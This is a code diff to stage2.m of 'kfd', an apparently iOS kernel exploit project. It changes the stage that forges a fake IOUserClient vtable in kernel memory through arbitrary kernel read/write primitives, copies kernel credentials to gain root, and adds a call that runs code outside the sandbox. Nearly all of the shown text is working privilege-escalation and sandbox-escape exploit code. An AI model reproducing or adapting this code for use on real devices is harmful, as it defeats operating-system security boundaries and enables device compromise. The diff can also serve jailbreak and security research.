@@ -2,7 +2,7 @@
 //  stage2.m
 //  kfd
 //
-//  Created by Seo Hyun-gyu on 2023/08/10.
+//  Created by m1zole on 2023/08/10.
 //
 
 #import <Foundation/Foundation.h>
@@ -12,6 +12,7 @@
 #include "proc.h"
 #include "stage2.h"
 #include "escalate.h"
+#include "sandbox.h"
 
 mach_port_t user_client;
 uint64_t fake_client;
@@ -72,14 +73,14 @@ void mineek_init_kcall(void) {
     printf("[i] Found addr: 0x%llx\n", uc_addr);
     uint64_t uc_vtab = kread64(uc_addr);
     printf("[i] Found vtab: 0x%llx\n", uc_vtab);
-    uint64_t fake_vtable = mineek_dirty_kalloc(0x1000);
+    fake_vtable = mineek_dirty_kalloc(0x1000);
     printf("[i] Created fake_vtable at %016llx\n", fake_vtable);
     for (int i = 0; i < 0x200; i++) {
         kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
     }
     printf("[i] Copied some of the vtable over\n");
     fake_client = mineek_dirty_kalloc(0x2000);
-    printf("[i] Created fake_client at %016llx\n", fake_client);
+    printf("[i] Created fake_client at 0x%016llx\n", fake_client);
     for (int i = 0; i < 0x200; i++) {
         kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
     }
@@ -112,7 +113,7 @@ void mineek_getRoot(uint64_t proc_addr)
     printf("[i] test_uid = %d\n", getuid());
 
     uint64_t kernproc = get_kernproc();
-    printf("[i] kern proc: %llx\n", kernproc);
+    printf("[i] kern proc: 0x%llx\n", kernproc);
     uint64_t kern_ro = kread64(kernproc + 0x20);
     printf("[i] kern_ro: 0x%llx\n", kern_ro);
     uint64_t kern_ucred = kread64(kern_ro + 0x20);
@@ -139,27 +140,19 @@ void ucred_test(uint64_t proc_addr) {
     
     uint64_t ucred = self_ucred;
     
-    printf("[i] proc + off_p_uid:  0x%x\n", kread32(kernproc + off_p_uid));
-    printf("[i] proc + off_p_ruid: 0x%x\n", kread32(kernproc + off_p_ruid));
-    printf("[i] proc + off_p_gid:  0x%x\n", kread32(kernproc + off_p_gid));
-    printf("[i] proc + off_p_rgid: 0x%x\n", kread32(kernproc + off_p_rgid));
-    printf("[i] ucred + off_u_cr_uid:     0x%x\n", kread32(ucred + off_u_cr_uid));
-    printf("[i] ucred + off_u_cr_ruid:    0x%x\n", kread32(ucred + off_u_cr_ruid));
-    printf("[i] ucred + off_u_cr_svuid:   0x%x\n", kread32(ucred + off_u_cr_svuid));
-    printf("[i] ucred + off_u_cr_ngroups: 0x%x\n", kread32(ucred + off_u_cr_ngroups));
-    printf("[i] ucred + off_u_cr_groups:  0x%x\n", kread32(ucred + off_u_cr_groups));
-    printf("[i] ucred + off_u_cr_rgid:    0x%x\n", kread32(ucred + off_u_cr_rgid));
-    printf("[i] ucred + off_u_cr_svgid:   0x%x\n", kread32(ucred + off_u_cr_svgid));
-    //uint64_t cr_posix_ptr = 0;
-    //cr_posix_ptr = ucred + 0x18;
-    //printf("[i] svuid: 0x%x\n", kread32(cr_posix_ptr + 0x8));
-    //kwrite32(cr_posix_ptr + 0x8, 0x0);
-    //cr_posix_ptr = ucred + 0x18;
-    //printf("[i] cr_groups: 0x%x\n", kread32(cr_posix_ptr + 0x8));
-    //kwrite32(cr_posix_ptr + 0x10, 0x0);
-    //cr_posix_ptr = ucred + 0x18;
-    //printf("[i] svgid: 0x%x\n", kread32(cr_posix_ptr + 0x8));
-    //kwrite32(cr_posix_ptr + 0x54, 0x0);
+    printf("[DEBUG] proc + off_p_uid:  0x%x\n", kread32(kernproc + off_p_uid));
+    printf("[DEBUG] proc + off_p_ruid: 0x%x\n", kread32(kernproc + off_p_ruid));
+    printf("[DEBUG] proc + off_p_gid:  0x%x\n", kread32(kernproc + off_p_gid));
+    printf("[DEBUG] proc + off_p_rgid: 0x%x\n", kread32(kernproc + off_p_rgid));
+    printf("[DEBUG] ucred + off_u_cr_uid:     0x%x\n", kread32(ucred + off_u_cr_uid));
+    printf("[DEBUG] ucred + off_u_cr_ruid:    0x%x\n", kread32(ucred + off_u_cr_ruid));
+    printf("[DEBUG] ucred + off_u_cr_svuid:   0x%x\n", kread32(ucred + off_u_cr_svuid));
+    printf("[DEBUG] ucred + off_u_cr_ngroups: 0x%x\n", kread32(ucred + off_u_cr_ngroups));
+    printf("[DEBUG] ucred + off_u_cr_groups:  0x%x\n", kread32(ucred + off_u_cr_groups));
+    printf("[DEBUG] ucred + off_u_cr_rgid:    0x%x\n", kread32(ucred + off_u_cr_rgid));
+    printf("[DEBUG] ucred + off_u_cr_svgid:   0x%x\n", kread32(ucred + off_u_cr_svgid));
+    
+    printf("[i] uid: %d, gid: %d\n", getuid(), getgid());
 }
 
 void stage2(void) {
@@ -173,5 +166,7 @@ void stage2(void) {
     mineek_getRoot(proc_addr);
     usleep(10000);
     ucred_test(proc_addr);
-    platformize(getpid());
+    //kalloc_using_empty_kdata_page();
+    run_unsandboxed((^{sandbox_test();}), pid);
+    init_kcall();
 }
